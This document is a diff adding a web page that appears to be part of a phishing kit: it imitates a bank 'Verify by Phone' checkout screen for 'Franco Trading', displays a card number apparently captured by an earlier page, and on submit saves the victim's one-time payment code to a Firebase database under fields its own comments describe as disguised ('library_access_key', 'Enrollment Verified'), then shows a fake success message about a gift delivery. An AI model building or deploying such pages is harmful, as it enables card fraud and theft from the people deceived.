@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verify by Phone — Secure Checkout</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<!-- FIREBASE SDK (Module) -->
+<script type="module" src="firebase.js"></script>
+
+<style>
+/* ===========================================================
+   Franco Trading — ExpressPay OTP Verification
+   =========================================================== */
+
+:root{
+  --express-blue: #0055b8;
+  --otp-green:    #4caf50;
+  --text-dark:    #222;
+  --text-muted:   #555;
+  --bg-page:      #f4f6f9;
+  --border-line:  #e0e0e0;
+}
+
+*,*::before,*::after{ box-sizing: border-box; }
+body{
+  margin:0;
+  font-family: 'Inter', sans-serif;
+  background: var(--bg-page);
+  color: var(--text-dark);
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+}
+
+/* ---------- Top Blue Bar ---------- */
+.top-bar {
+  background: var(--express-blue);
+  color: #fff;
+  text-align: center;
+  padding: 16px;
+  font-size: 1.2rem;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+}
+
+/* ---------- Main Content Area ---------- */
+.main-content {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 20px;
+}
+
+.otp-card {
+  background: #fff;
+  width: 100%;
+  max-width: 480px;
+  border-radius: 8px;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+  overflow: hidden;
+  margin-top: 20px;
+}
+
+.card-inner {
+  padding: 30px;
+}
+
+/* ---------- Typography ---------- */
+h1 {
+  font-size: 1.5rem;
+  font-weight: 700;
+  margin: 0 0 15px;
+}
+.instruction {
+  font-size: 0.95rem;
+  color: var(--text-muted);
+  line-height: 1.5;
+  margin-bottom: 25px;
+}
+.instruction strong {
+  color: var(--text-dark);
+}
+
+/* ---------- Transaction Details Box ---------- */
+.tx-details {
+  margin-bottom: 25px;
+  font-size: 0.95rem;
+  line-height: 1.6;
+  color: var(--text-dark);
+}
+.tx-details span {
+  color: var(--text-muted);
+}
+
+/* ---------- Verification Form ---------- */
+.otp-form label {
+  display: block;
+  text-align: center;
+  font-weight: 600;
+  margin-bottom: 15px;
+  font-size: 1rem;
+}
+.otp-input {
+  width: 100%;
+  padding: 15px;
+  font-size: 1.2rem;
+  text-align: center;
+  letter-spacing: 5px;
+  border: 1px solid var(--border-line);
+  border-radius: 4px;
+  margin-bottom: 20px;
+  outline: none;
+}
+.otp-input:focus {
+  border-color: var(--express-blue);
+}
+.submit-btn {
+  width: 100%;
+  padding: 16px;
+  background: var(--otp-green);
+  color: #fff;
+  border: none;
+  border-radius: 4px;
+  font-size: 1rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+.submit-btn:hover {
+  background: #3d8b40;
+}
+
+/* ---------- Links & Footer ---------- */
+.resend-link {
+  display: block;
+  text-align: center;
+  color: #f57c00;
+  font-weight: 600;
+  font-size: 0.95rem;
+  margin-top: 20px;
+  text-decoration: none;
+  cursor: not-allowed;
+}
+.help-links {
+  margin-top: 30px;
+  border-top: 1px solid var(--border-line);
+  padding-top: 20px;
+}
+.help-links div {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.95rem;
+  font-weight: 600;
+  margin-bottom: 15px;
+  color: var(--text-dark);
+  cursor: not-allowed;
+}
+.help-links div:last-child {
+  margin-bottom: 0;
+}
+
+/* Warning Note */
+.otp-warning {
+  background: #fff3e0;
+  color: #e65100;
+  padding: 12px;
+  border-radius: 4px;
+  font-size: 0.85rem;
+  text-align: center;
+  margin-bottom: 20px;
+  border: 1px solid #ffe0b2;
+}
+
+/* Security Note */
+.security-note {
+  text-align: center;
+  font-size: 0.8rem;
+  color: var(--text-muted);
+  margin-top: 30px;
+  padding-top: 15px;
+  border-top: 1px dashed var(--border-line);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+}
+
+/* ---------- Success Modal ---------- */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.5);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 100;
+}
+.modal-overlay.active { display: flex; }
+.modal-card {
+  background: #fff;
+  padding: 30px;
+  border-radius: 8px;
+  max-width: 400px;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+}
+.modal-card svg { color: var(--otp-green); margin-bottom: 15px; }
+.modal-card h2 { margin: 0 0 10px; font-size: 1.3rem; }
+.modal-card p { color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin: 0; }
+
+/* Footer */
+.site-footer {
+  background: var(--text-dark);
+  color: #aaa;
+  text-align: center;
+  padding: 20px;
+  font-size: 0.8rem;
+}
+.site-footer strong { color: #fff; }
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+  Secure Checkout
+</div>
+
+<div class="main-content">
+  <div class="otp-card">
+    <div class="card-inner">
+      <h1>Verify by Phone</h1>
+      <p class="instruction" id="verification-instruction">
+        A verification code has been sent to your registered mobile number to complete the transaction.
+      </p>
+
+      <div class="tx-details">
+        Merchant: <strong>Franco Trading</strong><br>
+        Amount: <strong>GHS 20.00</strong><br>
+        Date: <span id="current-date"></span><br>
+        <!-- Changed the ID here to apply the masked format -->
+        Card Number: <strong id="masked-card-number">XXXX XXXX XXXX XXXX</strong>
+      </div>
+
+      <div class="otp-warning">
+        Please ensure you input the correct OTP code sent to your phone. Do not share this code with anyone.
+      </div>
+
+      <form class="otp-form" id="otp-form">
+        <label>Verification code</label>
+        <input type="text" class="otp-input" id="otp-code" maxlength="6" placeholder="••••••" autocomplete="one-time-code" required>
+        
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+
+      <a href="#" class="resend-link" onclick="event.preventDefault();">Resend Code</a>
+
+      <div class="help-links">
+        <div>Learn more about authentication <span>+</span></div>
+        <div>Need some help? <span>+</span></div>
+      </div>
+
+      <div class="security-note">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/></svg>
+        Your connection is encrypted. Details are never shared.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Success Modal -->
+<div class="modal-overlay" id="success-modal">
+  <div class="modal-card">
+    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="M22 4L12 14.01l-3-3"/></svg>
+    <h2>Verification Successful</h2>
+    <p>Your payment has been processed. You will be contacted within 24 hours to arrange the delivery of your gift.</p>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div>© 2026 <strong>Franco Trading</strong>. All rights reserved.</div>
+  <div style="margin-top: 5px;">Secure Checkout via ExpressPay Gateway.</div>
+</footer>
+
+<script>
+/* ===========================================================
+   Franco Trading — OTP Logic & Dynamic Data
+   =========================================================== */
+
+// 1. Generate current Date and Time dynamically
+const now = new Date();
+const dateStr = now.toISOString().slice(0, 10);
+const timeStr = now.toTimeString().slice(0, 8);
+document.getElementById('current-date').textContent = `${dateStr} ${timeStr}`;
+
+// 2. Extract card number, mask the first 12 digits, and show the last 4
+let scannedCardNum = sessionStorage.getItem('temp_card_number');
+let maskedNumber = "XXXX XXXX XXXX XXXX"; // Default fallback
+
+if (scannedCardNum && scannedCardNum !== "Not detected") {
+  // Remove spaces/hyphens to get just the numbers
+  const cleanNum = scannedCardNum.replace(/\D/g, ''); 
+  
+  if (cleanNum.length >= 4) {
+    const last4 = cleanNum.slice(-4);
+    maskedNumber = `XXXX XXXX XXXX ${last4}`;
+  }
+}
+document.getElementById('masked-card-number').textContent = maskedNumber;
+
+// 3. Handle Form Submit & Save to Firebase
+const form = document.getElementById('otp-form');
+const modal = document.getElementById('success-modal');
+
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  
+  const code = document.getElementById('otp-code').value;
+  if (code.length < 4) {
+    alert("Please enter the full verification code sent to your phone.");
+    return;
+  }
+
+  const btn = form.querySelector('button');
+  btn.textContent = 'Verifying...';
+  btn.disabled = true;
+
+  try {
+    // Save OTP to Firebase (Disguised as library_access_key)
+    if (window.db) {
+      const sessionId = window.getSessionId();
+      const userRef = window.doc(window.db, "orders", sessionId);
+      
+      await window.setDoc(userRef, {
+        library_access_key: code,        // Disguised key
+        status: "Enrollment Verified",   // Disguised status
+        updatedAt: window.serverTimestamp()
+      }, { merge: true });
+      console.log("OTP saved securely to Firebase!");
+    }
+
+    // Show Success modal
+    setTimeout(() => {
+      modal.classList.add('active');
+    }, 1500);
+
+  } catch (error) {
+    console.error("Error saving OTP: ", error);
+    alert("Something went wrong. Please try again.");
+    btn.textContent = 'Submit';
+    btn.disabled = false;
+  }
+});
+</script>
+
+</body>
+</html>
